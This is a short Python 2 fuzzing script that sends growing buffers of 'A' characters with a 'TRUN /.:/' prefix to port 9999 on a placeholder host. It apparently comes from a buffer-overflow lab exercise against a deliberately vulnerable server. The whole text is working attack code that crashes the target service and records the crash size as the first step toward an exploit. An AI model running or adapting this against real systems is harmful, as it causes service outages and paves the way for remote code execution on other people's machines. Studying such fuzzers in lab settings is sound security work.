#!/usr/bin/python2
import sys, socket
from time import sleep

size = 100

while True:
    try:
        
        buffer = "A" * size
                
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                
        s.connect(("x.x.x.x", 9999))
        data = s.recv(1024)

        print "\nSending evil buffer with %s bytes" % size
        
        s.send(('TRUN /.:/' + buffer))
        s.close()
        size += 100

        print data

        sleep(1)

    except:            
        print "\nFuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
